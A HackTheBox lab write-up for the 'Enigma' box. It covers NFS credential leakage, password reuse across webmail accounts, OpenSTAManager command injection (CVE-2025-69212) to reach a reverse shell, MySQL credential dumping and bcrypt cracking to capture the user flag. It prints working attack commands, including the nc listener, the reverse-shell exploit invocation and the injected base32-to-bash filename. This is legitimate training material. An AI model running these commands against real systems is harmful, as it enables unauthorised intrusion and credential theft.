# HackTheBox — Enigma

**Target:** 10.129.45.193   **DNS:** enigma.htb   **OS:** Linux (Ubuntu 24.04-era)   **Difficulty:** _TBD_   **Date:** 2026-07-03
**Status:** USER OWNED — privesc to root pending (next session)
**User flag:** `e5c3a1931804f232d411c29e61c7ba72`

---

## Executive Summary

Enigma is a mail-themed Linux box whose entire foothold chain is built on **credential leakage and reuse**, not memory-corruption exploits:

1. An **anonymous NFS export** (`/srv/nfs/onboarding`) leaks an onboarding PDF containing a new employee's webmail credentials.
2. Those creds log into **Roundcube webmail**; the mailbox and **password reuse** lead to a second user's mailbox, which leaks **admin credentials for OpenSTAManager**.
3. OpenSTAManager 2.9.8 is vulnerable to **CVE-2025-69212** (authenticated OS command injection) → reverse shell as `www-data`.
4. The app's DB config + a cracked bcrypt hash from the app database give the system user **`haris`** → **user flag**.
5. Privilege escalation to root — **not yet completed** (see "Next Session").

**Credential trail (the theme of the box):**

| Credential | Source | Used for |
|---|---|---|
| `kevin : Enigma2024!` | NFS onboarding PDF | Roundcube (kevin) |
| `sarah : Enigma2024!` | password reuse (same default) | Roundcube (sarah) |
| `admin : Ne3s4rtars78s` | email in sarah's mailbox | OpenSTAManager admin |
| `brollin : Fri3nds@9099` | OSM `config.inc.php` (on box) | MySQL |
| `haris : bestfriends` | cracked bcrypt from OSM `zz_users` | `su haris` (user) |

---

## 1. Recon

### 1.1 Nmap — full service scan

```
nmap -Pn -A -sS -sV -sC 10.129.45.193 -oN enigmaScan.txt -v
```

| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 |
| 80 | HTTP | nginx 1.24.0 (Ubuntu) → redirects to `http://enigma.htb/` |
| 110 | POP3 | Dovecot pop3d (STLS) |
| 143 | IMAP | Dovecot imapd |
| 993 | IMAPS | Dovecot imapd (SSL) |
| 995 | POP3S | Dovecot pop3d (SSL) |
| 111 | rpcbind | RPC 100000 v2-4 |
| 2049 | NFS | nfs_acl v3 (RPC 100227); mountd on 39191 |

- OS: Linux 4.15–5.19. TLS cert `commonName=enigma`.
- **Three attack surfaces:** NFS (2049), the Dovecot mail stack (110/143/993/995), and the web app (80).

**Add the vhost** (nginx redirects to a hostname, so name resolution is required):

```
echo "10.129.45.193 enigma.htb" | sudo tee -a /etc/hosts
```

**Reasoning / prioritisation:** NFS is the cheapest, highest-value lead — exports are frequently world-readable and can hand over files/credentials with no exploitation. A full mail server is a deliberate design choice, signalling the intended path is *read a mailbox once a credential is held*. So: enumerate NFS first, keep the mail stack in reserve for when we have creds.

### 1.2 NFS enumeration

```
showmount -e 10.129.45.193
```
```
Export list for 10.129.45.193:
/srv/nfs/onboarding *
```

- `*` = exported to **any host**, no authentication at mount level. World-mountable.
- "onboarding" strongly implies new-employee material (default creds, setup docs).

**Mount and inspect:**

```
mkdir -p ~/mnt/onboarding
sudo mount -t nfs 10.129.45.193:/srv/nfs/onboarding ~/mnt/onboarding -o vers=3,nolock
ls -laR ~/mnt/onboarding
```

Result: a single file, world-readable (no UID trick needed):

```
-rw-r--r-- 1 root root 1751 Feb 19 14:53 New_Employee_Access.pdf
```

---

## 2. Foothold

### 2.1 Onboarding PDF → first credentials

Copy off the share and read it:

```
cp ~/mnt/onboarding/New_Employee_Access.pdf ~/HTB/
pdftotext ~/HTB/New_Employee_Access.pdf -
```

Contents (Enigma Corp IT — "New Employee System Access"):

- **Employee:** Kevin Mitchell (Operations)
- **Webmail URL:** `http://mail001.enigma.htb`
- **Username:** `kevin`  **Password:** `Enigma2024!`  ("change on first login")
- **Support:** `it@enigma.htb`
- **Username convention: first name only** (`kevin` for Kevin Mitchell) — reuse to guess other accounts.

Add the new vhost:

```
echo "10.129.45.193 mail001.enigma.htb" | sudo tee -a /etc/hosts
```

### 2.2 Webmail fingerprint — Roundcube 1.6.16

The login page source (`http://mail001.enigma.htb`) reveals the version:

```
rcmail.set_env({... "rcversion":10616 ...});
```

`10616` decodes as `major*10000 + minor*100 + patch` → **Roundcube 1.6.16**.

- This is a **patched build** — past CVE-2025-49113 (fixed in 1.6.11). **The webmail itself is not the exploit path.**
- Intended route: **log in and read mail.** The credential is the key, not a CVE.

### 2.3 Kevin's mailbox → second user

Log in `kevin : Enigma2024!`. Mailbox contains one email:

- From **`sarah@enigma.htb`** ("Welcome to Enigma Corp") — Sarah, Accounts department → **user `sarah`**.
- Flavour text, but it confirms a second valid account.

**Important recon fact discovered here:** SSH is **public-key only** (password auth disabled) — so recovered passwords can't be sprayed at SSH; they must be used against the web/mail services.

```
ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no kevin@enigma.htb
# → Permission denied (publickey)  [no password prompt = password auth off]
```

### 2.4 Password reuse → Sarah's mailbox → OpenSTAManager creds

The onboarding password is a **shared corporate default** — it works for Sarah too:

```
Login at http://mail001.enigma.htb  →  sarah : Enigma2024!   ✅
```

Sarah's mailbox contains an email from `it@enigma.htb` ("Re: OpenSTAManager Access Request"):

- **App:** OpenSTAManager at **`http://support_001.enigma.htb`** (note the underscore)
- **Creds:** **`admin : Ne3s4rtars78s`**

Add the vhost:

```
echo "10.129.45.193 support_001.enigma.htb" | sudo tee -a /etc/hosts
```

### 2.5 OpenSTAManager version → CVE match

Log in `admin : Ne3s4rtars78s`. Footer of the dashboard:

```
Version 2.9.8 (5ff39df9b)
```

OpenSTAManager 2.9.8 ↔ **CVE-2025-69212** — authenticated OS command injection.

- **Root cause:** `src/Util/XML.php::decodeP7M()` runs `openssl` on an uploaded `.p7m` invoice filename inside double quotes. `$(...)` is still evaluated, so a filename like `x$(cmd).p7m` executes commands as the web user. Filenames can't contain `/`, so the PoC base32-encodes the payload and decodes it at runtime.
- Alternate paths if this were patched: CVE-2026-38751 (module-upload RCE ≤2.10), CVE-2026-24417 / 24418 / CVE-2025-69213 (authenticated SQLi).

### 2.6 Exploit — CVE-2025-69212 → reverse shell as www-data

```
git clone https://github.com/jonathan-corbin/CVE-2025-69212-Authenticated-RCE-PoC.git
cd CVE-2025-69212-Authenticated-RCE-PoC && chmod +x exploit.py
```

Listener (attacker):

```
nc -lvnp 4444
```

Fire the exploit (reverse-shell mode; `10.10.16.141` = tun0):

```
python3 exploit.py -u http://support_001.enigma.htb -l admin -p 'Ne3s4rtars78s' -s 10.10.16.141 -P 4444
```

Shell returned as `www-data`. The injected artifact is visible in the webroot as
`z$(echo${IFS}...|base32${IFS}-d|bash).p7m` — the base32-encoded payload filename.

```
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Stabilise the TTY:**

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z  →  stty raw -echo; fg  →  Enter  →  export TERM=xterm
```

---

## 3. Post-Exploitation → User (`haris`)

### 3.1 Enumerate users

```
cat /etc/passwd
```

- **`haris`** (uid 1000, `/home/haris`, `/bin/bash`) — the real login user; target for user flag.
- `kevin`, `sarah`, `it` — `nologin` (mail-only accounts; explains the mailboxes).
- ⚠️ **`_laurel`** present → **Laurel** (auditd log processor) is running → commands are being audited/logged.

### 3.2 OpenSTAManager DB config → MySQL creds

```
cat /var/www/html/openstamanager/config.inc.php
```
```php
$db_host     = 'localhost';
$db_username = 'brollin';
$db_password = 'Fri3nds@9099';
$db_name     = 'openstamanager';
```

`Fri3nds@9099` and `Enigma2024!` were both tested against `su haris` — **both failed.** No direct reuse, so mine the database.

### 3.3 Dump the app database → haris bcrypt hash

```
mysql -u brollin -p'Fri3nds@9099' openstamanager -e "show tables;"
mysql -u brollin -p'Fri3nds@9099' openstamanager -e "select id,username,password,email,enabled from zz_users;"
```
```
id  username  password                                                        email
1   admin     $2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu    admin@enigma.htb
2   haris     $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC    haris@enigma.htb
```

(`em_accounts` was also checked for stored SMTP passwords — nothing usable.)

### 3.4 Crack the bcrypt → su haris

On the attacker box:

```
echo '$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC' > haris.hash
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt haris.hash
```
```
bestfriends      (?)      # cracked in ~3s
```

Switch user and grab the flag:

```
su haris        # password: bestfriends
id
uid=1000(haris) gid=1000(haris) groups=1000(haris),100(users)
cat /home/haris/user.txt
e5c3a1931804f232d411c29e61c7ba72
```

**USER FLAG: `e5c3a1931804f232d411c29e61c7ba72`** ✅

---

## 4. Privilege Escalation → Root  _(PENDING — next session)_

Not yet attempted. Starting points for the next session, in priority order:

1. **sudo rights:** `sudo -l` (password `bestfriends`) — fastest possible win.
2. **haris's local mailbox:** `/home/haris/mail` exists — on a mail-themed box this may hold root creds or a hint. `cat /home/haris/mail/*`.
3. **SUID hunt:** `find / -perm -4000 -type f 2>/dev/null`.
4. **Cron / custom services:** `cat /etc/crontab`, `systemctl list-timers`, `ls -la /opt`.
5. **Group `users` (gid 100):** check for files/dirs writable by that group (`find / -group users 2>/dev/null`).
6. **Laurel/auditd note:** commands are logged — worth reading `/etc/audit/` and the laurel config; sometimes reveals what the box is watching for.

---

## 5. What Worked / What Didn't

**Worked**
- **NFS-first prioritisation.** `showmount -e` immediately exposed a world-readable onboarding share — the whole chain unspooled from that one PDF.
- **Credential reuse spraying.** The single default `Enigma2024!` moved us kevin → sarah. Always spray a recovered password across every account/service.
- **Version-to-CVE matching.** Reading the exact Roundcube (1.6.16, patched → skip) and OpenSTAManager (2.9.8, vulnerable → CVE-2025-69212) versions told us *which* app to attack and which to ignore — no blind exploitation.
- **App-DB → OS pivot.** When app creds didn't reuse for the system user, the app's own DB held a crackable hash for that user.

**Didn't work / dead ends**
- **Exploiting Roundcube** — patched build (1.6.16 > 1.6.11). Correctly skipped.
- **SSH password spraying** — password auth disabled server-wide; only the web/mail services accept passwords.
- **Direct reuse of `Fri3nds@9099` / `Enigma2024!` for `haris`** — failed; the hash had to be cracked instead.

## 6. Lessons Learned / Reusable Techniques

- **Enumerate NFS before anything else** (`showmount -e`, then `mount -t nfs ... -o vers=3,nolock`). A `*` export is a free file read; check owner UID/perms on each file.
- **A mail server in the port list = plan to read mailboxes.** Validate creds against IMAPS with curl (`curl -k --url imaps://host:993/INBOX --user u:p`) or just log into the webmail; then walk *every* folder (Inbox/Sent/Drafts/Junk) and Contacts.
- **Decode Roundcube version from the login page** (`rcversion` int = `major*10000+minor*100+patch`) to decide exploit-vs-skip.
- **OpenSTAManager 2.9.8 → CVE-2025-69212**: authenticated `.p7m` filename command injection. Any valid login → RCE via `jonathan-corbin/CVE-2025-69212-Authenticated-RCE-PoC` (`-s IP -P PORT` for a reverse shell).
- **Always read a web app's `config.inc.php` after RCE** — DB creds there frequently reuse for a system user, and the app DB (`zz_users`) holds bcrypt hashes worth cracking (`john --format=bcrypt` / `hashcat -m 3200`).
- **Note defensive tooling** (`_laurel` user → auditd/Laurel) so you know your actions are logged.

Cross-references: `methodology/core-principles.md` (enumerate first, simple before complex), `checklists/server-side-attacks.md`, `checklists/sql-injection.md`.
